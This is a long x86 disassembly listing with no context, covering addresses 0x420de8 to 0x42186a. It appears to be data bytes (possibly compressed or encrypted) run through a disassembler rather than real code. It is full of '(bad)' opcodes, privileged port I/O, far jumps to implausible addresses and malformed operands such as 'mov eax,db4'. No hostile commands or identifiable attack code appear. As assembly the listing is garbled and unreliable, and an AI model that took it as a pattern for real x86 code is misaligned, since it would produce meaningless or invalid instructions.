  420de8:	fisubr WORD PTR [esp+ecx*4]
  420deb:	mov    edx,0xf280d456
  420df0:	je     0x420dbf
  420df2:	sbb    DWORD PTR ds:[edx-0x154f1fc3],ebx
  420df9:	sub    eax,0xbd4a5859
  420dfe:	fimul  WORD PTR [ebx+edx*8]
  420e01:	sub    al,0xf3
  420e03:	pop    esp
  420e04:	pop    esi
  420e05:	test   dl,ah
  420e07:	push   ss
  420e08:	adc    ecx,ebp
  420e0a:	mov    bl,0x3f
  420e0c:	lea    ecx,[edx+0x3a]
  420e0f:	into   
  420e10:	adc    BYTE PTR [edx],cl
  420e12:	push   0xffffffc2
  420e14:	out    0xe9,al
  420e16:	adc    BYTE PTR [esp+edx*4-0x4],al
  420e1a:	dec    esi
  420e1b:	dec    ebx
  420e1c:	mov    edx,0xe0950a9a
  420e21:	mov    fs,eax
  420e23:	or     DWORD PTR [edi+0x1e],ecx
  420e26:	xor    bh,dh
  420e28:	mov    eax,ds:0xcb298697
  420e2d:	clc    
  420e2e:	fcom   QWORD PTR [ebx-0x7f7f0c5d]
  420e34:	jmp    0x420e67
  420e36:	cmpps  xmm7,xmm5,0x57
  420e3a:	cld    
  420e3b:	adc    al,0xb1
  420e3d:	mov    ch,0x62
  420e3f:	push   0xffffffcb
  420e41:	out    0x1d,eax
  420e43:	pop    edi
  420e44:	rol    DWORD PTR [esi],cl
  420e46:	or     eax,0x6a100317
  420e4b:	jo     0x420e88
  420e4d:	icebp  
  420e4e:	in     eax,0xf5
  420e50:	repz das 
  420e52:	mov    al,ds:0x63e2f661
  420e57:	xor    al,0x13
  420e59:	and    al,0xcc
  420e5b:	dec    esp
  420e5d:	pop    edi
  420e5e:	pop    ds
  420e5f:	cmp    al,0xe0
  420e61:	adc    eax,0x5dad8f0c
  420e66:	sbb    al,0x11
  420e68:	ret    
  420e69:	pop    ebx
  420e6a:	or     DWORD PTR [ebp+edi*2+0x75],eax
  420e6e:	add    DWORD PTR ss:[edi-0x4eb9bd66],esp
  420e75:	mov    eax,db4
  420e78:	jns    0x420ed6
  420e7a:	(bad)  
  420e7b:	sti    
  420e7c:	mov    eax,ds:0xd51001b0
  420e81:	push   eax
  420e82:	pop    eax
  420e83:	stc    
  420e84:	inc    ebp
  420e85:	ror    DWORD PTR [ebx+0x5d],1
  420e88:	mov    al,ds:0xda2ef963
  420e8d:	(bad)  
  420e8f:	push   ebx
  420e90:	mov    bh,0xc1
  420e92:	pop    esi
  420e93:	(bad)  
  420e94:	jne    0x420ec4
  420e96:	int    0xb2
  420e98:	mov    ch,dl
  420e9a:	lds    esi,FWORD PTR [edi]
  420e9c:	pushf  
  420e9d:	xor    edi,DWORD PTR [ebx+0xcc8f439]
  420ea3:	and    al,0x56
  420ea5:	aaa    
  420ea6:	js     0x420eb9
  420ea8:	adc    al,0x72
  420eaa:	push   esi
  420eab:	(bad)  
  420eac:	dec    esi
  420ead:	dec    esi
  420eae:	push   cs
  420eaf:	out    0x86,eax
  420eb1:	pop    esi
  420eb2:	mov    esi,0x6176
	...
  420f13:	add    BYTE PTR [eax],al
  420f15:	add    BYTE PTR [eax],ah
  420f17:	xchg   edi,eax
  420f18:	inc    edx
  420f19:	shl    edi,cl
  420f1b:	xlat   BYTE PTR ds:[ebx]
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	bound  esp,QWORD PTR ds:[ebp+edx*4+0x74]
  420f26:	mov    edx,0x700015d
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [ebp+ebx*2-0x63],bl
  420f31:	sbb    eax,edx
  420f33:	jmp    0xf1633011
  420f38:	popa   
  420f39:	jecxz  0x420f16
  420f3b:	gs in  al,dx
  420f3d:	inc    edi
  420f3e:	test   esp,ebx
  420f40:	adc    BYTE PTR [edx+0x27d4c204],bh
  420f46:	push   ecx
  420f47:	xor    BYTE PTR [ebx-0x19],dl
  420f4a:	out    dx,al
  420f4b:	xchg   DWORD PTR [ebp-0x5cc0ff13],ebx
  420f51:	xor    DWORD PTR [edi+0x3],eax
  420f54:	scas   eax,DWORD PTR es:[edi]
  420f55:	mov    ss,edx
  420f57:	push   cs
  420f58:	adc    ch,BYTE PTR [ebp-0x1c]
  420f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f5c:	(bad)  [ebx-0x5ce3844b]
  420f62:	xchg   edx,eax
  420f63:	das    
  420f64:	jg     0x420f6f
  420f66:	and    DWORD PTR [ebx+0x3e107d14],0x70
  420f6d:	in     eax,dx
  420f6e:	in     eax,dx
  420f6f:	call   0x28bd:0x60cb76e2
  420f76:	lahf   
  420f77:	xor    eax,0xd8f88994
  420f7c:	jecxz  0x420efe
  420f7e:	inc    eax
  420f7f:	xlat   BYTE PTR ds:[ebx]
  420f80:	(bad)  
  420f81:	jl     0x420f0f
  420f83:	mov    ds:0xcd43d0b9,al
  420f88:	mov    ?,WORD PTR [ecx]
  420f8a:	mov    bh,0x5d
  420f8c:	mov    ecx,esp
  420f8e:	sbb    al,0x1a
  420f90:	mov    ebp,0x9cc89804
  420f95:	lods   eax,DWORD PTR ds:[esi]
  420f96:	xor    bh,BYTE PTR ds:0x3f213965
  420f9c:	jno    0x420f6c
  420f9e:	retf   0x6aab
  420fa1:	aam    0xc0
  420fa3:	popa   
  420fa4:	mov    ebp,0xf6cba0f7
  420fa9:	or     BYTE PTR [eax-0x10],ah
  420fac:	cmp    ah,BYTE PTR [ecx]
  420fae:	xlat   BYTE PTR ds:[ebx]
  420faf:	lds    ebx,FWORD PTR [edx]
  420fb1:	js     0x420fbc
  420fb3:	adc    al,0xac
  420fb5:	jae    0x421028
  420fb7:	and    eax,0x62c53595
  420fbc:	into   
  420fbd:	std    
  420fbe:	hlt    
  420fbf:	leave  
  420fc0:	jge    0x420f4c
  420fc2:	adc    esi,DWORD PTR [ecx+0x42bb6f05]
  420fc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fc9:	out    0x3,al
  420fcb:	or     al,0x16
  420fcd:	ja     0x421040
  420fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fd1:	fild   DWORD PTR [edi+ebx*8+0x51]
  420fd5:	or     edi,DWORD PTR [eax+0x167cab07]
  420fdb:	sahf   
  420fdc:	pop    esi
  420fdd:	loope  0x420ff7
  420fdf:	push   esi
  420fe0:	mov    ah,BYTE PTR [ebp-0x69]
  420fe3:	dec    edi
  420fe4:	test   eax,0xbbf3c90
  420fe9:	xchg   esi,eax
  420fea:	mov    al,0x99
  420fec:	and    dh,BYTE PTR [ebx+eax*8-0x28]
  420ff0:	scas   al,BYTE PTR es:[edi]
  420ff1:	add    al,BYTE PTR [edi+ecx*8]
  420ff4:	xchg   esi,eax
  420ff5:	(bad)  
  420ff6:	test   eax,0x18891465
  420ffb:	repz add DWORD PTR [edi],0xbf597e43
  421002:	cs inc ebx
  421004:	or     eax,0x2a320285
  421009:	push   edx
  42100a:	loop   0x420fa0
  42100c:	xor    ah,al
  42100e:	pop    ecx
  42100f:	es (bad) 
  421011:	xlat   BYTE PTR ds:[ebx]
  421012:	jno    0x42101c
  421014:	cmp    DWORD PTR gs:[edi+0x7789246b],0x4f96c7b2
  42101f:	mov    eax,0x3eafdf55
  421024:	fsubrp st(2),st
  421026:	ret    0xb920
  421029:	dec    edx
  42102a:	dec    ebx
  42102b:	xchg   ecx,eax
  42102c:	dec    eax
  42102d:	das    
  42102e:	inc    esp
  42102f:	shl    BYTE PTR [edi+0x5e],1
  421032:	sub    al,0xb9
  421034:	pop    ss
	...
  421095:	add    BYTE PTR [edi-0x243925a2],bl
  42109b:	(bad)  
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x45e3fcfe
  4210a5:	(bad)
  4210a9:	add    BYTE PTR [edi],al
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [esi-0x25],dl
  4210b0:	inc    edi
  4210b1:	sbb    ebp,DWORD PTR [ebp-0x7046d63]
  4210b7:	cmp    eax,0xe7bd0c2c
  4210bc:	dec    edx
  4210bd:	mov    ch,0x6b
  4210bf:	imul   ecx,DWORD PTR [edx-0x4c],0xffffffe2
  4210c3:	aad    0x88
  4210c5:	ret    
  4210c6:	leave  
  4210c7:	mov    ecx,0x355267ee
  4210cc:	pop    esp
  4210cd:	fistp  WORD PTR [ebx]
  4210cf:	and    BYTE PTR [ecx],ah
  4210d1:	and    eax,eax
  4210d3:	mov    bl,0x22
  4210d5:	xor    BYTE PTR [ecx+0x41],bl
  4210d8:	fwait
  4210d9:	dec    edi
  4210da:	mov    bl,0xb4
  4210dc:	inc    edi
  4210dd:	clc    
  4210de:	mov    bl,0x38
  4210e0:	sub    eax,0x9239df78
  4210e5:	push   es
  4210e6:	and    BYTE PTR [ebx-0x18e9b40d],ah
  4210ec:	pusha  
  4210ed:	pop    ecx
  4210ee:	iret   
  4210ef:	add    dl,0x8d
  4210f2:	mov    eax,ds:0x755b9f46
  4210f7:	ins    BYTE PTR es:[edi],dx
  4210f8:	ins    BYTE PTR es:[edi],dx
  4210f9:	jmp    0xa005e1b
  4210fe:	mov    edi,0x27d39535
  421103:	xor    esi,ebp
  421105:	scas   al,BYTE PTR es:[edi]
  421106:	jne    0x4210e5
  421108:	dec    esp
  421109:	xor    eax,ebp
  42110b:	add    al,BYTE PTR [edx]
  42110d:	mov    ds:0x1bf51e48,al
  421112:	in     eax,dx
  421113:	gs hlt 
  421115:	retf   0x8f4
  421118:	inc    ebx
  421119:	pushf  
  42111a:	adc    eax,0x93413ba1
  42111f:	push   ss
  421120:	mov    edi,0xda2a7474
  421125:	push   eax
  421126:	call   0x99395d1a
  42112b:	out    dx,eax
  42112c:	sbb    BYTE PTR [eax+0xd],dl
  42112f:	int3   
  421130:	pop    edx
  421131:	or     ebp,DWORD PTR [ecx]
  421133:	sti    
  421134:	int3   
  421135:	nop
  421136:	mov    dl,0x2d
  421138:	xchg   ecx,eax
  421139:	into   
  42113a:	or     DWORD PTR [edx],0x37
  42113d:	xor    ah,bh
  42113f:	ret    
  421140:	xor    BYTE PTR ds:0x1d7d5522,al
  421146:	bound  esp,QWORD PTR [esi+0x21]
  421149:	xchg   esp,eax
  42114a:	mov    ah,0x54
  42114c:	dec    ecx
  42114d:	dec    eax
  42114e:	add    cl,BYTE PTR [esp+ecx*8]
  421151:	fdivr  st,st(5)
  421153:	mov    esp,0xe63860d8
  421158:	sbb    DWORD PTR [edi-0x5f],esi
  42115b:	cmp    eax,0x24e5a134
  421160:	mov    esi,0x3520a452
  421165:	stos   BYTE PTR es:[edi],al
  421166:	int3   
  421167:	push   edi
  421168:	addr16 in eax,0x6b
  42116b:	jnp    0x421185
  42116d:	popa   
  42116e:	leave  
  42116f:	sbb    al,0x6c
  421171:	jae    0x4211ac
  421173:	sub    DWORD PTR [edi+edx*8],ebp
  421176:	xchg   dl,ah
  421178:	push   cs
  421179:	mov    WORD PTR [esi],ss
  42117b:	(bad)
  42117e:	(bad)  
  42117f:	mov    eax,ds:0x3daaca1d
  421184:	sub    BYTE PTR [edi+0x8],dl
  421187:	cdq    
  421188:	call   DWORD PTR [eax]
  42118a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42118b:	into   
  42118c:	add    edi,ecx
  42118e:	ds loop 0x4211f9
  421191:	repz push esi
  421193:	(bad)  
  421194:	(bad)  
  421195:	jge    0x4211e6
  421197:	push   ss
  421198:	mov    BYTE PTR [eax+0x794c4921],dl
  42119e:	xchg   edx,eax
  42119f:	(bad)  
  4211a0:	sti    
  4211a1:	fcmovnb st,st(4)
  4211a3:	fld    DWORD PTR ds:[ebp+eax*4-0x4b8c5fc2]
  4211ab:	add    esp,DWORD PTR [edx-0x34]
  4211ae:	cmp    eax,0x4efb4b19
  4211b3:	das    
  4211b4:	leave  
	...
  421215:	add    BYTE PTR [esi-0x700870e1],bl
  42121b:	idiv   esi
  42121d:	jg     0x421280
  42121f:	pop    es
  421220:	and    BYTE PTR [ecx-0x44],cl
  421223:	add    ah,ch
  421225:	imul   ecx,eax,0x700015f
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    BYTE PTR [ebx+0x73ba3fff],dh
  421233:	nop
  421234:	adc    ebx,DWORD PTR [ecx]
  421236:	imul   esp,ebx,0x1e
  421239:	mov    al,ds:0xbbe1d464
  42123e:	mov    DWORD PTR ds:0x364d758,eax
  421244:	popa   
  421245:	cld    
  421246:	sar    cl,1
  421248:	add    BYTE PTR [ecx+ebx*1-0x59],dh
  42124c:	mov    DWORD PTR [ecx+0x2f],0x2818709e
  421253:	inc    esi
  421254:	mov    WORD PTR [edi],?
  421256:	test   DWORD PTR [edx],0xe99452bb
  42125c:	stos   DWORD PTR es:[edi],eax
  42125d:	xor    eax,0x7e9bc309
  421262:	cs jg  0x4211f9
  421265:	test   esp,ecx
  421267:	mov    ds:0xf370abe3,eax
  42126c:	cs pop ds
  42126e:	rcl    ebp,0xbe
  421271:	add    ebp,ebx
  421273:	pusha  
  421274:	push   edi
  421275:	stos   BYTE PTR es:[edi],al
  421276:	leave  
  421277:	popa   
  421278:	(bad)  
  421279:	out    0xa4,eax
  42127b:	or     eax,0xaf238a99
  421280:	mov    al,0x29
  421282:	pop    ecx
  421283:	mov    cs,ecx
  421285:	xor    al,0x3c
  421287:	cdq    
  421288:	bound  ecx,QWORD PTR [ecx-0x10962c4b]
  42128e:	frstor [eax-0xa]
  421291:	and    al,0x16
  421293:	ja     0x421285
  421295:	out    dx,al
  421296:	mov    bl,BYTE PTR [ebx-0x5fcc301d]
  42129c:	or     DWORD PTR [edi+ebx*8-0x6c9e775b],ebx
  4212a3:	sbb    eax,0xc189fdf3
  4212a8:	jo     0x421266
  4212aa:	xchg   ecx,eax
  4212ab:	scas   eax,DWORD PTR es:[edi]
  4212ac:	lea    edi,[ecx+0x65382f0e]
  4212b2:	and    eax,0x20f7ecca
  4212b7:	adc    dh,BYTE PTR [edi+ebx*1-0x7d]
  4212bb:	loopne 0x421266
  4212bd:	test   DWORD PTR [ebx+0x62],esp
  4212c0:	ss out 0x47,eax
  4212c3:	or     al,0x61
  4212c5:	es xchg ecx,eax
  4212c7:	add    al,0x2a
  4212c9:	inc    edx
  4212ca:	rol    BYTE PTR ds:0x61b6f2b1,1
  4212d0:	push   0x52
  4212d2:	mul    DWORD PTR [eax+0x6c79ab91]
  4212d8:	jmp    0xe06:0x5b883339
  4212df:	loop   0x421265
  4212e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212e2:	lods   al,BYTE PTR ds:[esi]
  4212e3:	pusha  
  4212e4:	in     ax,dx
  4212e6:	mov    eax,ds:0x87a3bb97
  4212eb:	xchg   ebp,eax
  4212ec:	leave  
  4212ed:	(bad)  
  4212ee:	cmc    
  4212ef:	into   
  4212f0:	mov    BYTE PTR [ecx-0x73],dl
  4212f3:	aaa    
  4212f4:	fwait
  4212f5:	fs out 0x1a,eax
  4212f8:	in     eax,dx
  4212f9:	jg     0x42127f
  4212fb:	or     eax,0xc0fc5bc9
  421300:	retf   0x8b46
  421303:	std    
  421304:	pushf  
  421305:	neg    bl
  421307:	dec    ebx
  421308:	inc    edi
  421309:	adc    eax,0x1d59fc16
  42130e:	mov    cl,0x14
  421310:	inc    DWORD PTR [esi]
  421312:	add    esp,0xc0df128f
  421318:	push   0xc050788f
  42131d:	jbe    0x4212eb
  42131f:	and    eax,0xeefee833
  421324:	mov    esp,0x60be80b0
  421329:	xchg   BYTE PTR [edx-0x1a7bacc3],bh
  42132f:	sub    al,0x95
  421331:	fimul  DWORD PTR [ebx+ebp*8]
  421334:	in     eax,0x0
	...
  421396:	inc    bh
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0x486c04b0
  4213a3:	loope  0x421369
  4213a5:	xor    eax,0x160cf
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [eax],bh
  4213af:	push   ss
  4213b0:	dec    esp
  4213b1:	rol    BYTE PTR [eax],1
  4213b3:	fwait
  4213b4:	or     al,0x56
  4213b6:	cmp    eax,0x5b63453d
  4213bb:	mov    BYTE PTR [esi+0x4dea65a5],dh
  4213c1:	add    DWORD PTR [ebx],edx
  4213c3:	xchg   ecx,eax
  4213c4:	dec    edi
  4213c5:	(bad)  
  4213c6:	push   ecx
  4213c7:	not    DWORD PTR [ecx+0x270a3014]
  4213cd:	jns    0x42138f
  4213cf:	out    dx,al
  4213d0:	shl    dh,0x59
  4213d3:	test   al,0xcd
  4213d5:	das    
  4213d6:	bound  eax,QWORD PTR [edx-0x25]
  4213d9:	mov    ds:0xae4ad899,al
  4213de:	xor    al,0xe5
  4213e0:	cmp    eax,0x6664d061
  4213e5:	retf   0x6968
  4213e8:	cmp    BYTE PTR [edx],ah
  4213ea:	test   BYTE PTR [eax],ch
  4213ec:	or     al,0xf2
  4213ee:	ins    DWORD PTR es:[edi],dx
  4213ef:	(bad)  
  4213f0:	sub    eax,0xd9398acb
  4213f5:	sub    ch,BYTE PTR [ecx]
  4213f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213f8:	pusha  
  4213f9:	mov    ds:0x15cc10f6,eax
  4213fe:	mov    cl,0x6f
  421400:	hlt    
  421401:	in     eax,dx
  421402:	fnstsw WORD PTR [edx-0x5f]
  421405:	push   ds
  421406:	sub    eax,0x8f8a0ef7
  42140b:	ins    DWORD PTR es:[edi],dx
  42140c:	push   ss
  42140d:	shl    BYTE PTR [ebp+0x46],1
  421410:	test   eax,0x1cedf25b
  421415:	mov    ecx,0xc592ed35
  42141a:	stos   BYTE PTR es:[edi],al
  42141b:	cmp    BYTE PTR [eax-0x7ef90c5e],0xe1
  421422:	out    0xe8,al
  421424:	and    al,BYTE PTR [ebx+0x6d]
  421427:	nop
  421428:	mov    BYTE PTR [ebp-0x6ceec488],ch
  42142e:	jns    0x4214af
  421430:	jp     0x421459
  421432:	xlat   BYTE PTR ds:[ebx]
  421433:	add    eax,0x550d71c2
  421438:	ret    
  421439:	bnd jo 0x421458
  42143c:	mov    dl,ch
  42143e:	nop
  42143f:	sti    
  421440:	or     eax,0xd2e82635
  421445:	jle    0x4213d6
  421447:	cmp    al,0x6a
  421449:	fisubr DWORD PTR [ebx]
  42144b:	mov    cl,0x94
  42144d:	cld    
  42144e:	push   ss
  42144f:	mov    esp,0x377362df
  421454:	mov    eax,edi
  421456:	and    DWORD PTR ds:[ecx],esi
  421459:	dec    ecx
  42145a:	loop   0x4214d9
  42145c:	mov    bh,0xfd
  42145e:	push   ds
  42145f:	jp     0x421419
  421461:	push   0x8a898bb6
  421466:	jne    0x421489
  421468:	out    dx,al
  421469:	push   ebx
  42146a:	in     eax,dx
  42146b:	loope  0x42141f
  42146d:	retf   0x31d
  421470:	int    0x54
  421472:	mov    dl,0xbc
  421474:	pop    es
  421475:	pop    esp
  421476:	loopne 0x42145c
  421478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421479:	xor    BYTE PTR [esi-0x19],cl
  42147c:	mov    ds:0x1d98d30d,eax
  421481:	pop    ecx
  421482:	es in  al,0xa4
  421485:	mov    es,WORD PTR [ecx+0x7081b14d]
  42148b:	nop
  42148c:	inc    esi
  42148d:	loope  0x42149e
  42148f:	mov    DWORD PTR [ebp+0x3b12c1d9],0xf93afb7
  421499:	mov    ebx,0x171e7f50
  42149e:	jno    0x42147a
  4214a0:	push   es
  4214a1:	outs   dx,DWORD PTR ds:[esi]
  4214a2:	arpl   WORD PTR [ebp+0x8],cx
  4214a5:	cmp    al,ah
  4214a7:	add    eax,0x929c0017
  4214ac:	aaa    
  4214ad:	aaa    
  4214ae:	addr16 add eax,0x753e1d7
  4214b4:	ja     0x4214b6
	...
  421516:	(bad)  
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	mov    ebx,0xd6c028b4
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    BYTE PTR [ecx],ah
  42152f:	loop   0x421546
  421531:	xor    BYTE PTR [eax+0x12b18efe],dl
  421537:	jg     0x421531
  421539:	loopne 0x42158d
  42153b:	adc    eax,0xa4bed3a8
  421540:	dec    ebx
  421541:	ss pop edi
  421543:	mov    ds:0x2606f3f4,eax
  421548:	fs sub edi,ebx
  42154b:	xor    BYTE PTR [eax],dh
  42154d:	jl     0x421556
  42154f:	xor    BYTE PTR [eax-0x217c26c8],ch
  421555:	push   ds
  421556:	stos   BYTE PTR es:[edi],al
  421557:	xchg   BYTE PTR [ebx],al
  421559:	loopne 0x4215a9
  42155b:	inc    esp
  42155c:	daa    
  42155d:	popf   
  42155e:	loope  0x421540
  421560:	scas   eax,DWORD PTR es:[edi]
  421561:	xor    al,0x62
  421563:	data16 into 
  421565:	jmp    0x4205:0x9a7df639
  42156c:	or     eax,0x5c2f2ba7
  421571:	add    al,0x7b
  421573:	mov    al,0x4e
  421575:	cmp    BYTE PTR [esi+0x5a],dh
  421578:	xchg   esi,eax
  421579:	mov    esi,0xd40ae1d6
  42157e:	pop    ds
  42157f:	shl    eax,0xd7
  421582:	loop   0x4215d7
  421584:	adc    eax,0x7ac7179c
  421589:	pop    ebx
  42158a:	or     eax,0xb6926df3
  42158f:	add    al,0xa6
  421591:	mov    dh,0x89
  421594:	sub    dl,dl
  421596:	popf   
  421597:	push   0x42
  421599:	out    0x3f,al
  42159b:	ror    DWORD PTR [edi+0x4c],1
  42159e:	enter  0x5d3e,0x51
  4215a2:	mov    bh,0xe9
  4215a4:	jo     0x421613
  4215a6:	push   ds
  4215a7:	mov    ch,0xdc
  4215a9:	jnp    0x421551
  4215ab:	cld    
  4215ac:	mov    eax,0x75f61
  4215b1:	sti    
  4215b2:	jecxz  0x421593
  4215b4:	inc    ebp
  4215b5:	ffree  st(6)
  4215b7:	cmp    ecx,DWORD PTR [eax-0x18260b2f]
  4215bd:	push   eax
  4215be:	push   ecx
  4215bf:	cmp    DWORD PTR [ecx+0x2b],ecx
  4215c2:	sbb    ecx,0xffffffc5
  4215c5:	pop    edi
  4215c6:	jge    0x4215af
  4215c8:	xor    DWORD PTR [esp+ebp*8],ebp
  4215cb:	fmulp  st(7),st
  4215cd:	leave  
  4215ce:	dec    esi
  4215cf:	xchg   esi,eax
  4215d0:	mov    DWORD PTR [esi-0x7],eax
  4215d3:	nop
  4215d4:	push   cs
  4215d5:	retf   0x4559
  4215d8:	cmpxchg DWORD PTR [edi+0x6663c4c9],ebx
  4215df:	cs xor eax,0x63958e1c
  4215e5:	retf   
  4215e6:	inc    esp
  4215e7:	xor    bh,al
  4215e9:	jmp    0x20d5:0xa9d71eb0
  4215f0:	bound  edi,QWORD PTR [edx-0x5b]
  4215f3:	xor    edx,esp
  4215f5:	cwde   
  4215f6:	add    eax,0x5c6f1309
  4215fb:	mov    ah,0xe3
  4215fd:	mov    al,0xaa
  4215ff:	mov    edx,0x993a5ca7
  421604:	cmp    bl,cl
  421606:	cmp    BYTE PTR [eax+0x18],0x16
  42160a:	or     eax,0x6bf7f9aa
  42160f:	(bad)  
  421610:	pop    esi
  421611:	pusha  
  421612:	push   es
  421613:	lds    esp,FWORD PTR [eax+0x3b368c92]
  421619:	mov    ebp,0x97659d8a
  42161e:	lahf   
  42161f:	sbb    eax,0xd0fca131
  421624:	mov    al,BYTE PTR [ebx]
  421626:	and    BYTE PTR [ebp+0x72],cl
  421629:	ss mov esp,0x58ec3af1
  42162f:	pushf  
  421630:	jl     0x421645
  421632:	cmp    eax,0x7cc0
	...
  421693:	add    BYTE PTR [eax],al
  421695:	add    BYTE PTR [ebx-0x105512d4],ch
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	push   esi
  4216a3:	pop    edx
  4216a4:	mov    al,0x5d
  4216a6:	frstor [edx+0x1]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    dh,bl
  4216af:	jle    0x4216ec
  4216b1:	pusha  
  4216b2:	data16 sahf 
  4216b4:	dec    ecx
  4216b5:	mul    DWORD PTR [edi-0x5c]
  4216b8:	inc    eax
  4216b9:	inc    ecx
  4216ba:	dec    edi
  4216bb:	adc    DWORD PTR [ebx+edx*2+0x34],ecx
  4216bf:	xchg   BYTE PTR [ebp-0x74],al
  4216c2:	jnp    0x421709
  4216c4:	adc    ebp,DWORD PTR [ebx+edi*2+0x866e485]
  4216cb:	sub    al,0xb9
  4216cd:	mov    dl,0x4f
  4216cf:	rcl    BYTE PTR [ecx-0x7],cl
  4216d2:	mov    DWORD PTR [esi-0x53ce0eca],esp
  4216d8:	sti    
  4216d9:	push   cs
  4216da:	mov    ebp,0xfe1bd847
  4216df:	adc    al,0x23
  4216e1:	pop    esi
  4216e2:	or     ebp,DWORD PTR [ebp+0x451c3b41]
  4216e8:	loopne 0x4216b3
  4216ea:	cwde   
  4216eb:	push   cs
  4216ec:	jno    0x4216df
  4216ee:	js     0x4216a8
  4216f0:	mov    bl,0xbd
  4216f2:	sub    edx,edx
  4216f4:	and    BYTE PTR [ecx-0x13],ah
  4216f7:	hlt    
  4216f8:	adc    DWORD PTR [ebp-0x6efeb48a],ebp
  4216fe:	fcomp  st(0)
  421700:	dec    eax
  421701:	mov    cl,BYTE PTR [edx+0x3e]
  421704:	popf   
  421705:	mov    dl,0x3f
  421707:	mov    eax,ds:0xda8cc16f
  42170c:	push   ss
  42170d:	dec    esp
  42170e:	test   al,0x35
  421710:	stos   DWORD PTR es:[edi],eax
  421711:	in     al,dx
  421712:	ins    DWORD PTR es:[edi],dx
  421713:	mov    dl,0xc7
  421715:	or     ebp,eax
  421717:	jno    0x42170b
  421719:	push   ecx
  42171a:	adc    BYTE PTR [eax],dh
  42171c:	lds    esp,FWORD PTR [edi]
  42171e:	test   al,0xaa
  421720:	sub    bh,BYTE PTR [eax]
  421722:	xchg   edx,eax
  421723:	or     DWORD PTR [edx],ebp
  421725:	mov    fs:0xa41510d6,al
  42172b:	outs   dx,BYTE PTR ds:[esi]
  42172c:	mov    al,0xb8
  42172e:	adc    ebp,DWORD PTR [ebx]
  421730:	sub    BYTE PTR [ebx-0x1a],dh
  421733:	push   esp
  421734:	adc    DWORD PTR [esi-0x11],edi
  421737:	out    0x36,al
  421739:	into   
  42173a:	retf   
  42173b:	or     eax,0x84822d4b
  421740:	scas   al,BYTE PTR es:[edi]
  421741:	inc    eax
  421742:	in     al,dx
  421743:	pop    eax
  421744:	scas   al,BYTE PTR es:[edi]
  421745:	pop    es
  421746:	cld    
  421747:	jecxz  0x421740
  421749:	sti    
  42174a:	xchg   edi,eax
  42174b:	call   0x19e5:0xcdf78951
  421752:	bound  esp,QWORD PTR [ebx-0x42]
  421755:	sbb    esp,ebp
  421757:	dec    edx
  421758:	and    ebp,esi
  42175a:	jg     0x421705
  42175c:	jns    0x4217da
  42175e:	cdq    
  42175f:	sahf   
  421760:	adc    eax,0xd9e2c157
  421765:	repz xor ecx,ecx
  421768:	pop    ebp
  421769:	fcmovne st,st(3)
  42176b:	sti    
  42176c:	test   BYTE PTR [ebp-0x5f],dh
  42176f:	and    al,0x28
  421771:	bound  ecx,QWORD PTR [esp+ebx*1]
  421774:	aad    0x69
  421776:	and    BYTE PTR [edi+0x93c1f8b],ch
  42177c:	and    al,0xfb
  42177e:	into   
  42177f:	pushf  
  421780:	mov    cs,WORD PTR [ecx+0x35766f26]
  421786:	mov    bh,0x4a
  421788:	pop    ecx
  421789:	push   edi
  42178a:	ret    0x81e9
  42178d:	arpl   WORD PTR [ebx+0x24],si
  421790:	jmp    0x8b9b21ec
  421795:	xor    esi,DWORD PTR [ebx]
  421797:	out    dx,eax
  421798:	in     al,0xac
  42179a:	xchg   esp,eax
  42179b:	xchg   ebx,eax
  42179c:	ret    
  42179d:	mov    ah,0xdc
  42179f:	xchg   DWORD PTR [eax+0xc],esp
  4217a2:	clc    
  4217a3:	or     DWORD PTR [eax-0x49],0xffffffb0
  4217a7:	xchg   ecx,eax
  4217a8:	jbe    0x4217d5
  4217aa:	pop    esp
  4217ab:	inc    ebp
  4217ac:	rcl    DWORD PTR [ecx-0x4d370dd1],0x55
  4217b3:	repnz cmp al,BYTE PTR [eax]
	...
  421816:	shl    DWORD PTR [eax-0x6061f47],1
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	dec    edi
  421823:	adc    eax,0x63e4ce34
  421828:	add    DWORD PTR [eax],eax
  42182a:	pop    es
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    BYTE PTR [ebp-0xff3bc43],ch
  421833:	lock out dx,al
  421835:	adc    DWORD PTR [ebp-0x2],eax
  421838:	xor    dl,BYTE PTR [ebp-0x6a56bbd8]
  42183e:	stos   DWORD PTR es:[edi],eax
  42183f:	adc    DWORD PTR [edi],ecx
  421841:	ins    DWORD PTR es:[edi],dx
  421842:	retf   0x826f
  421845:	jl     0x421878
  421847:	jmp    0xcd28:0xe563f157
  42184e:	xchg   ebp,eax
  42184f:	cmc    
  421850:	pop    esi
  421851:	mov    dh,0x5c
  421853:	push   edi
  421854:	pop    ss
  421855:	test   DWORD PTR [ebp+0xcbb64d6],0x3ecac2c0
  42185f:	mov    eax,ds:0x48739527
  421864:	mov    ebx,DWORD PTR [ebp+0x6b107cd2]
  42186a:	sbb    al,0xe3
